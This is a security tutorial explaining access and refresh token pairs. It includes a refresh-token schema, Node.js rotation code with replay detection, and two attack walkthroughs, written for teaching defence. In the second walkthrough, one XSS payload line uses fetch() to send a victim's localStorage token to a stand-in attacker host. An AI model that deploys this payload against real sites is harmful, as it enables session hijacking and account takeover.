# Access Token vs Refresh Token — Part 1 of 3

### Sections: 1 (Attacker Intuition), 2 (Why It Exists), 3 (Core Technical), 4 (Attack Flows)

**Series:** Authentication & Security → Topic 04

---

## SECTION 1 — Attacker Intuition

### How an Attacker Thinks About Token Pairs

```
Two tokens. Different attack surfaces. Different attack windows.

ACCESS TOKEN:
  "This is a signed credential accepted by every API endpoint."
  "It's short-lived — but if I steal it, I have the full attack window."
  "If expiry is 24 hours rather than 15 minutes, I have 24 hours of free access."
  "It's used on every request — the more it's transmitted, the more surface area."
  "Stored in memory or cookie — my attack vector depends on the storage choice."

REFRESH TOKEN:
  "This is the master key. If I steal this, I can issue myself fresh access tokens indefinitely."
  "The refresh token outlives the access token by days or weeks."
  "It's stored at a path like /auth/refresh — if that endpoint is unprotected, I win big."
  "The database record backing the refresh token is the actual authorization."
  "If there's no rotation, a stolen refresh token = permanent account access."
  "If there's rotation but no replay detection, I can rotate it before the victim."

ONE THEFT, DIFFERENT CONSEQUENCES:
  Stolen access token:  access for <expiry period> (15 min to hours)
  Stolen refresh token: access until the victim's next login AND revokes the old token,
                        OR forever if victim never triggers a rotation conflict.

The token pair system assumes:
  Access token: frequently transmitted, short-lived, acceptable theft window.
  Refresh token: rarely used (only on access token expiry), long-lived, stored securely.
  Violate either assumption → the security model breaks.
```

---

## SECTION 2 — Why It Exists

### The Core Tension: Usability vs. Security

```
NAIVE APPROACH 1 — Long-lived access token (e.g., 24-hour or 7-day JWT):

  User convenience: users stay logged in across browser restarts, app backgrounds.
  Security problem: stolen token = 24-hour or 7-day window of full access.
  Attacker motivation: steal once, exploit for days.

NAIVE APPROACH 2 — Very short JWT, no refresh (e.g., 5-minute expiry):

  Security: stolen token window = 5 minutes.
  User experience: user must re-enter password every 5 minutes.
  Usability: completely unacceptable.

THE SOLUTION — Token pair:
  Access token: 15 minutes. Short-lived. Accepted by every API endpoint.
  Refresh token: 30 days. Long-lived. Accepted ONLY by the /auth/refresh endpoint.
                 Stored in database. Can be revoked instantly.

  Result:
    User experience: stays logged in for 30 days (refresh token handles silent renewal).
    Security cost of theft:
      Access token stolen: 15-minute window.
      Refresh token stolen: detectable and revocable via rotation + replay detection.

  This is the design used by Google, Microsoft, Spotify, GitHub, AWS Cognito, Auth0.
```

### Real-World Motivation: OAuth 2.0 Standard

```
OAuth 2.0 (RFC 6749, 2012) standardized the access token + refresh token pattern.

ORIGINAL CONTEXT:
  Problem: "I want to let a third-party app access my Google Drive without giving it my password."
  Old solution: Give the third-party your Google password (terrible).

OAuth solution:
  1. You log in to Google.
  2. Google asks: "Do you allow ReadBox to access your Google Drive?"
  3. You approve.
  4. Google issues ReadBox an access token (limited scope) + refresh token.
  5. ReadBox uses the access token to read your Drive.
  6. Access token expires → ReadBox uses refresh token to get a new access token.
  7. You can revoke access from Google account settings any time:
     Google deletes refresh token → ReadBox cannot get new access tokens → access ends.

LESSON LEARNED:
  The security model of third-party access is directly applicable to first-party access.
  Same threat model: limit what a stolen credential can do.
  Same solution: short-lived access token + revocable refresh token.
```

---

## SECTION 3 — Core Technical Deep Dive

### Token Pair Design Specification

```
ACCESS TOKEN:
  Format:     JWT (signed — RS256 or HS256)
  Content:    user claims (sub, role, tenant_id, permissions)
  Lifetime:   15 minutes (production standard)
  Storage:    HttpOnly cookie (web) or memory (SPA) or secure storage (mobile)
  Transmitted: With every API request (high-frequency use)
  Verified by: API Gateway / any service — cryptographic only, no DB lookup
  Revocable:   Via JTI blocklist (optional) or wait for expiry

REFRESH TOKEN:
  Format:     Opaque random string (NOT JWT — no useful claims for an attacker to read)
              crypto.randomBytes(40).toString('base64url')
  Content:    Meaningless random bytes — server looks it up in DB to get user context
  Lifetime:   7-30 days (product decision — 30 days = "stay logged in for a month")
  Storage:    HttpOnly cookie, restricted path /auth/refresh
  Transmitted: ONLY to /auth/refresh endpoint — not sent on regular API calls
  Verified by: Database lookup + hash comparison
  Revocable:   Immediately — delete DB record

KEY SECURITY PRINCIPLE:
  If access token is stolen: impact limited to 15-minute window.
  If refresh token is stolen: detectable via rotation conflict.
  Both stolen simultaneously: user is fully compromised, but the rotation + revocation
  process provides the detection mechanism.
```

### Database Schema for Refresh Tokens

```sql
CREATE TABLE refresh_tokens (
  id            UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  token_hash    VARCHAR(64) NOT NULL UNIQUE,  -- SHA-256 of the raw token
  user_id       UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
  family_id     UUID NOT NULL,                -- Token rotation family identifier
  parent_id     UUID REFERENCES refresh_tokens(id),  -- Which token this replaced
  device_id     VARCHAR(255),                 -- Optional: device fingerprint
  ip_address    INET,
  user_agent    TEXT,
  created_at    TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  expires_at    TIMESTAMPTZ NOT NULL,
  last_used_at  TIMESTAMPTZ,
  is_revoked    BOOLEAN NOT NULL DEFAULT FALSE,
  revoked_at    TIMESTAMPTZ,
  revoke_reason VARCHAR(50)   -- 'logout', 'rotation', 'security_event', 'admin'
);

CREATE INDEX ON refresh_tokens (user_id);
CREATE INDEX ON refresh_tokens (family_id);
CREATE INDEX ON refresh_tokens (token_hash);
CREATE INDEX ON refresh_tokens (expires_at) WHERE is_revoked = FALSE;
```

### Complete Token Refresh Flow with Rotation

```javascript
import crypto from "crypto";
import jwt from "jsonwebtoken";

// ─────────────────────────────────────────────────────────────────────
// ISSUE: On successful login — issue both tokens
// ─────────────────────────────────────────────────────────────────────
async function issueTokenPair(user, res, deviceInfo = {}) {
  // 1. Issue access token (JWT)
  const accessToken = jwt.sign(
    {
      sub: user.id,
      email: user.email,
      role: user.role,
      tenant_id: user.tenantId,
      jti: crypto.randomUUID(),
    },
    PRIVATE_KEY,
    {
      algorithm: "RS256",
      expiresIn: "15m",
      issuer: ISSUER,
      audience: AUDIENCE,
    },
  );

  // 2. Generate opaque refresh token
  const rawRefreshToken = crypto.randomBytes(40).toString("base64url");
  const tokenHash = crypto
    .createHash("sha256")
    .update(rawRefreshToken)
    .digest("hex");

  // 3. Store refresh token in DB (hashed — never store raw)
  const familyId = crypto.randomUUID(); // New family for each login
  await db.query(
    `INSERT INTO refresh_tokens
     (token_hash, user_id, family_id, ip_address, user_agent, expires_at)
     VALUES ($1, $2, $3, $4, $5, NOW() + INTERVAL '30 days')`,
    [tokenHash, user.id, familyId, deviceInfo.ip, deviceInfo.userAgent],
  );

  // 4. Set access token cookie (short-lived, all paths)
  res.cookie("__Host-at", accessToken, {
    httpOnly: true,
    secure: true,
    sameSite: "lax",
    maxAge: 15 * 60 * 1000, // 15 minutes
    path: "/",
  });

  // 5. Set refresh token cookie (long-lived, restricted to /auth path)
  res.cookie("__Host-rt", rawRefreshToken, {
    httpOnly: true,
    secure: true,
    sameSite: "lax",
    maxAge: 30 * 24 * 60 * 60 * 1000, // 30 days
    path: "/auth", // Cookie only sent to /auth/* routes — NOT to API routes
  });

  return { accessToken }; // Can optionally return in body too if needed for mobile
}

// ─────────────────────────────────────────────────────────────────────
// REFRESH: Exchange old refresh token for new access + refresh token
// ─────────────────────────────────────────────────────────────────────
async function refreshTokenHandler(req, res) {
  const rawRefreshToken = req.cookies["__Host-rt"];
  if (!rawRefreshToken) {
    return res.status(401).json({ error: "NO_REFRESH_TOKEN" });
  }

  const tokenHash = crypto
    .createHash("sha256")
    .update(rawRefreshToken)
    .digest("hex");

  // Look up the token record
  const tokenRecord = await db.query(
    `SELECT rt.*, u.id as uid, u.email, u.role, u.tenant_id
     FROM refresh_tokens rt
     JOIN users u ON rt.user_id = u.id
     WHERE rt.token_hash = $1`,
    [tokenHash],
  );

  if (!tokenRecord) {
    return res.status(401).json({ error: "INVALID_REFRESH_TOKEN" });
  }

  // ⚠ REPLAY DETECTION: If token is already revoked (used and rotated previously):
  // This means someone is replaying a stolen token.
  // Revoke the ENTIRE family (all active tokens in this chain).
  if (tokenRecord.is_revoked) {
    await db.query(
      `UPDATE refresh_tokens SET is_revoked=true, revoke_reason='replay_attack'
       WHERE family_id = $1 AND is_revoked = false`,
      [tokenRecord.family_id],
    );
    // Clear cookies
    res.clearCookie("__Host-rt", { path: "/auth" });
    res.clearCookie("__Host-at", { path: "/" });
    // Alert security team
    await securityAlerts.raiseRefreshTokenReplay({
      userId: tokenRecord.user_id,
      familyId: tokenRecord.family_id,
    });
    return res.status(401).json({ error: "TOKEN_REUSE_DETECTED" });
  }

  // Check expiry
  if (new Date(tokenRecord.expires_at) < new Date()) {
    return res.status(401).json({ error: "REFRESH_TOKEN_EXPIRED" });
  }

  // ✅ Valid token: rotate it (mark old as revoked, issue new)
  const user = {
    id: tokenRecord.uid,
    email: tokenRecord.email,
    role: tokenRecord.role,
    tenantId: tokenRecord.tenant_id,
  };

  // Mark old token as rotated
  await db.query(
    `UPDATE refresh_tokens SET is_revoked=true, revoke_reason='rotation'
     WHERE id = $1`,
    [tokenRecord.id],
  );

  // Issue new token pair in the same family (rotation chain tracking)
  const rawNewRefreshToken = crypto.randomBytes(40).toString("base64url");
  const newTokenHash = crypto
    .createHash("sha256")
    .update(rawNewRefreshToken)
    .digest("hex");
  await db.query(
    `INSERT INTO refresh_tokens
     (token_hash, user_id, family_id, parent_id, expires_at)
     VALUES ($1, $2, $3, $4, NOW() + INTERVAL '30 days')`,
    [newTokenHash, user.id, tokenRecord.family_id, tokenRecord.id],
  );

  // Issue new access token
  const newAccessToken = jwt.sign(
    {
      sub: user.id,
      email: user.email,
      role: user.role,
      tenant_id: user.tenantId,
      jti: crypto.randomUUID(),
    },
    PRIVATE_KEY,
    {
      algorithm: "RS256",
      expiresIn: "15m",
      issuer: ISSUER,
      audience: AUDIENCE,
    },
  );

  res.cookie("__Host-at", newAccessToken, {
    httpOnly: true,
    secure: true,
    sameSite: "lax",
    maxAge: 15 * 60 * 1000,
    path: "/",
  });
  res.cookie("__Host-rt", rawNewRefreshToken, {
    httpOnly: true,
    secure: true,
    sameSite: "lax",
    maxAge: 30 * 24 * 60 * 60 * 1000,
    path: "/auth",
  });

  return res.json({ success: true });
}
```

---

## SECTION 4 — Attack Flows

### Attack 1: Refresh Token Theft Without Rotation Detection

```
PRECONDITION: No refresh token rotation — same refresh token reused indefinitely.

STEP 1: Attacker steals the refresh token.
  Vector A: malware on victim's device reads HttpOnly cookies
            (OS-level access bypasses JavaScript restrictions)
  Vector B: compromise of database containing hashed tokens
            (if tokens are stored as plain text, they're immediately usable)
  Vector C: man-in-the-browser interception during /auth/refresh request

STEP 2: Victim is active. Victim uses their refresh token normally.
  Victim: POST /auth/refresh (cookie: rt=<TOKEN>) → new access token issued.
  Token not rotated: same refresh token still valid.

STEP 3: Attacker uses SAME refresh token independently.
  Attacker: POST /auth/refresh (rt=<TOKEN>) → new access token issued for attacker.
  System: no conflict detected. Two valid access tokens in parallel.

STEP 4: Attacker uses access token for 30 days.
  Victim changes password. Access token expires. But refresh token doesn't care.
  Victim has no idea. System has no anomaly detection.
  Attacker silently maintains access across the 30-day refresh token lifetime.

COMPLETE IMPACT:
  If refresh token lifetime is 30 days → 30 days of full account access.
  Data export, email change, account takeover — all possible silently.

DEFENSE:
  Refresh token rotation: every use of a refresh token invalidates it and creates a new one.
  If the victim uses their token: attacker's copy is now stale.
  If attacker uses first: victim's next use triggers replay detection → force logout.
  Either way: the conflict is detectable within one rotation cycle.
```

### Attack 2: Access Token Exfiltration from SPA localStorage

```
PRECONDITION: Access token stored in localStorage (common in React/Vue SPAs).

STEP 1: Target SPA stores access token in localStorage after login.
  localStorage.setItem('access_token', jwt)

STEP 2: Attacker finds any XSS in the application.
  Target: third-party analytics script, user-generated content, markdown rendering.
  Even a "minor" XSS in a comment field is sufficient.

STEP 3: Attacker's payload executes in the victim's browser:
  fetch('https://attacker.io/collect', {
    method: 'POST',
    body: JSON.stringify({ token: localStorage.getItem('access_token') })
  });

STEP 4: Access token captured. Attacker uses it immediately.
  Window: 15-minute access token (if properly configured).
  But: many systems use 1-hour or 24-hour access tokens "for UX reasons."

STEP 5: If access token is expired: attacker looks for refresh token.
  In localStorage: same script finds refresh token.
  In HttpOnly cookie: script returns null → cookie theft is blocked.

SCALE OF THIS ATTACK:
  The attacker doesn't personalize the attack per victim.
  XSS in a comment field seen by 50,000 users → 50,000 tokens collected in hours.

DEFENSE:
  Access token: HttpOnly cookie or memory variable.
  Refresh token: HttpOnly cookie with restricted path.
  XSS still bad: can make requests using the cookie automatically. But can't READ the token.
  Combined with CSRF token on state-changing endpoints: XSS impact dramatically reduced.
```
